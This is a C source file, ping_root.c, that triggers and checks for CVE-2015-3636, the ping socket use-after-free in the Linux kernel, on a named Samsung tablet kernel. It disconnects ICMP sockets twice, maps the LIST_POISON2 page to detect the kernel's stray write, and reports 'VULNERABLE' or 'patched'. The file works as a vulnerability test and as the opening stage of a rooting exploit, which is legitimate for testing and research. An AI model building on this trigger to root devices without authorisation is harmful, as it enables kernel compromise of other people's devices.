/*
 * ping_root.c - CVE-2015-3636 ping socket UAF exploit test
 * Samsung SM-T377A, kernel 3.10.9
 *
 * ping_unhash() doesn't mark socket as unhashed after removal.
 * Double disconnect causes write to LIST_POISON2 (0x00200200).
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define LIST_POISON1 0x00100100
#define LIST_POISON2 0x00200200
#define PAGE_SIZE    4096

static int test_ping_create(void) {
    printf("=== Test 1: Ping Socket Creation ===\n");
    int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);
    if (s < 0) { printf("  FAILED: %s\n", strerror(errno)); return -1; }
    printf("  OK: fd=%d\n", s);
    
    struct sockaddr_in a = {.sin_family=AF_INET, .sin_addr.s_addr=inet_addr("127.0.0.1")};
    int r = connect(s, (struct sockaddr*)&a, sizeof(a));
    printf("  connect: %d (errno=%d)\n", r, errno);
    
    struct sockaddr_in u = {.sin_family=AF_UNSPEC};
    r = connect(s, (struct sockaddr*)&u, sizeof(u));
    printf("  disconnect: %d (errno=%d)\n", r, errno);
    close(s);
    return 0;
}

static int test_double_disconnect(void) {
    printf("\n=== Test 2: Double Disconnect (CVE-2015-3636) ===\n");
    pid_t pid = fork();
    if (pid < 0) return -1;
    if (pid == 0) {
        int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);
        if (s < 0) _exit(1);
        struct sockaddr_in a = {.sin_family=AF_INET, .sin_addr.s_addr=inet_addr("127.0.0.1")};
        connect(s, (struct sockaddr*)&a, sizeof(a));
        struct sockaddr_in u = {.sin_family=AF_UNSPEC};
        int r1 = connect(s, (struct sockaddr*)&u, sizeof(u));
        int e1 = errno;
        int r2 = connect(s, (struct sockaddr*)&u, sizeof(u));
        int e2 = errno;
        int r3 = connect(s, (struct sockaddr*)&u, sizeof(u));
        int e3 = errno;
        printf("  disc1: ret=%d err=%d\n  disc2: ret=%d err=%d\n  disc3: ret=%d err=%d\n",
               r1,e1,r2,e2,r3,e3);
        close(s);
        _exit(0);
    }
    int st; waitpid(pid, &st, 0);
    if (WIFSIGNALED(st)) {
        printf("  *** CHILD KILLED (sig %d) ***\n", WTERMSIG(st));
        return 1;
    }
    printf("  Child exited OK (code %d)\n", WEXITSTATUS(st));
    return 0;
}

static int test_poison_page(void) {
    printf("\n=== Test 3: Mapped LIST_POISON2 ===\n");
    
    /* Check mmap_min_addr */
    FILE *f = fopen("/proc/sys/vm/mmap_min_addr", "r");
    if (f) {
        unsigned long ma; fscanf(f, "%lu", &ma); fclose(f);
        printf("  mmap_min_addr = %lu (0x%lx)\n", ma, ma);
        if (ma > LIST_POISON2) {
            printf("  Too high — cannot map LIST_POISON2\n");
            return -1;
        }
    }
    
    void *p2 = mmap((void*)0x00200000, PAGE_SIZE, PROT_READ|PROT_WRITE,
                     MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
    if (p2 == MAP_FAILED) {
        printf("  mmap 0x00200000 failed: %s\n", strerror(errno));
        return -1;
    }
    void *p1 = mmap((void*)0x00100000, PAGE_SIZE, PROT_READ|PROT_WRITE,
                     MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
    printf("  Mapped: LIST_POISON1=%p LIST_POISON2=%p\n", p1, p2);
    
    pid_t pid = fork();
    if (pid < 0) return -1;
    if (pid == 0) {
        memset((void*)0x00200000, 0x42, PAGE_SIZE);
        if (p1 != MAP_FAILED) memset((void*)0x00100000, 0x43, PAGE_SIZE);
        
        unsigned int before = *(unsigned int*)LIST_POISON2;
        
        int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);
        if (s < 0) _exit(1);
        struct sockaddr_in a = {.sin_family=AF_INET, .sin_addr.s_addr=inet_addr("127.0.0.1")};
        connect(s, (struct sockaddr*)&a, sizeof(a));
        struct sockaddr_in u = {.sin_family=AF_UNSPEC};
        connect(s, (struct sockaddr*)&u, sizeof(u));
        connect(s, (struct sockaddr*)&u, sizeof(u)); /* double */
        
        unsigned int after = *(unsigned int*)LIST_POISON2;
        if (before != after) {
            printf("  *** KERNEL WROTE TO 0x%08x! ***\n", LIST_POISON2);
            printf("  Before=0x%08x After=0x%08x\n", before, after);
            _exit(42);
        }
        printf("  No change at 0x%08x (0x%08x)\n", LIST_POISON2, after);
        close(s);
        _exit(0);
    }
    
    int st; waitpid(pid, &st, 0);
    munmap(p2, PAGE_SIZE);
    if (p1 != MAP_FAILED) munmap(p1, PAGE_SIZE);
    
    if (WIFSIGNALED(st)) {
        printf("  Child crashed (sig %d)\n", WTERMSIG(st));
        return 1;
    }
    if (WIFEXITED(st) && WEXITSTATUS(st) == 42) {
        printf("  *** CVE-2015-3636 CONFIRMED ***\n");
        return 2;
    }
    printf("  Not vulnerable (code %d)\n", WEXITSTATUS(st));
    return 0;
}

static int test_multi(void) {
    printf("\n=== Test 4: Multi-socket Stress ===\n");
    int socks[32];
    int n = 0;
    struct sockaddr_in a = {.sin_family=AF_INET, .sin_addr.s_addr=inet_addr("127.0.0.1")};
    struct sockaddr_in u = {.sin_family=AF_UNSPEC};
    
    for (int i = 0; i < 32; i++) {
        socks[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);
        if (socks[i] < 0) break;
        connect(socks[i], (struct sockaddr*)&a, sizeof(a));
        n++;
    }
    printf("  Created %d sockets\n", n);
    
    int d1=0, d2=0;
    for (int i = 0; i < n; i++)
        if (connect(socks[i], (struct sockaddr*)&u, sizeof(u)) == 0) d1++;
    printf("  Disconnect 1: %d/%d OK\n", d1, n);
    
    for (int i = 0; i < n; i++)
        if (connect(socks[i], (struct sockaddr*)&u, sizeof(u)) == 0) d2++;
    printf("  Disconnect 2: %d/%d OK\n", d2, n);
    
    /* Try reconnect */
    int rc=0;
    for (int i = 0; i < n; i++)
        if (connect(socks[i], (struct sockaddr*)&a, sizeof(a)) == 0) rc++;
    printf("  Reconnect: %d/%d OK\n", rc, n);
    
    for (int i = 0; i < n; i++) close(socks[i]);
    
    if (d2 > 0) printf("  *** Double-disconnect succeeded on %d sockets ***\n", d2);
    return d2 > 0 ? 1 : 0;
}

int main(void) {
    printf("=== ping_root: CVE-2015-3636 Test ===\n");
    printf("UID=%d\n\n", getuid());
    
    if (test_ping_create() < 0) {
        printf("Cannot create ping sockets\n");
        return 1;
    }
    
    int r2 = test_double_disconnect();
    int r3 = test_poison_page();
    int r4 = test_multi();
    
    printf("\n=== SUMMARY ===\n");
    printf("  Double disconnect: %s\n", r2 ? "CRASH" : "OK");
    printf("  Poison page: %s\n", r3==2 ? "VULNERABLE" : r3==1 ? "CRASH" : "patched");
    printf("  Multi-socket: %s\n", r4 ? "double-unhash works" : "patched");
    return 0;
}
